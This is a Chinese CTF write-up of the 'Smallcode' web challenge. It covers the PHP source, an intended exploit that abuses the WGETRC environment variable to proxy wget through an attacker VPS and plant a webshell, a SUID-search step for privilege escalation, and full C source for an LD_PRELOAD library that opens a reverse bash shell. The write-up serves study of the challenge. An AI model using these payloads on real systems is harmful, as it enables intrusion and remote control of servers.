---
date: 2026-01-19
category:
  - CTF
tag:
  - CTF
  - Web
  - 强网拟态
---

# Smallcode

​	本题来自2025强网拟态的线上赛，其中除了预期解还有Pikaball提供的一个非预期解。

## 题目源码

````php
<?php
    highlight_file(__FILE__);
    if(isset($_POST['context'])){
        $context = $_POST['context'];
        file_put_contents("1.txt",base64_decode($context));
    }

    if(isset($_POST['env'])){
        $env = $_POST['env'];
        putenv($env);
    }
    system("nohup wget --content-disposition -N hhhh &");
````

​	代码提供了两个接口，分别是向指定的 1.txt 任意写入内容和任意设置环境变量。

## 预期解

​	在 wget 中提供了一个默认配置文件，默认位置是 `/usr/local/etc/wgetrc`  其中的配置会在每次 wget 调用时候加载。

​	其中 wget 配置文件的地址可以使用 WGETRC 环境变量进行指定，其中对于文件名称和文件后缀没有强制要求，所以本题中我们可以通过指定 1.txt 为 WGETRC 的值，内容修改为：

```shell
http_proxy=vpsip:8888
output_document=/var/www/html/myshell.php
```

​	我们指定 wget 的代理为我们 vps 的地址，并且将下载文件保存在 myshell.php 中。

​	其实也可以了利用 `--content-disposition` 参数在vps中直接在请求头中下发存储目录。

​	之后就实现了 RCE , 接下来就是一个提权。

```shell
find / -user root -perm -u=s -print 2>/dev/null
```

## 牛逼解

​	Pikaball 提供了一个牛逼解，该解的主要思路是通过 LD_PRELOAD 环境变量，使得 php 在进行动态链接的时候，加载我们的恶意动态链接库。

​	我们可以在 1.txt 中写入恶意动态链接库的内容，并且在 LD_PRELOAD 中指向恶意的动态链接库。

```c++
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include <unistd.h>
#include <arpa/inet.h>
#include<netinet/in.h>
char *server_ip="";
uint32_t server_port=9999;
static void reverse_shell(void) __attribute__((constructor));
static void reverse_shell(void)
{
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in attacker_addr = {0};
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(server_port);
    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
    if(connect(sock, (struct sockaddr *)&attacker_addr,sizeof(attacker_addr))!=0)
        exit(0);
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    execve("/bin/bash", 0, 0);
}
```

​	Pikaball 的牛逼反弹 shell。`gcc hello.c -shared -fPIC -o libhello.so`

​	其中`static void reverse_shell(void) __attribute__((constructor));`使得在加载该 .so 文件时候，会自动调用 reverse_shell 函数，实现反弹 shell。

​	但是在本题中并不出网，所以 Pikaball 大师选择使用写入文件到同目录文件下，之后通过 web 服务查看即可。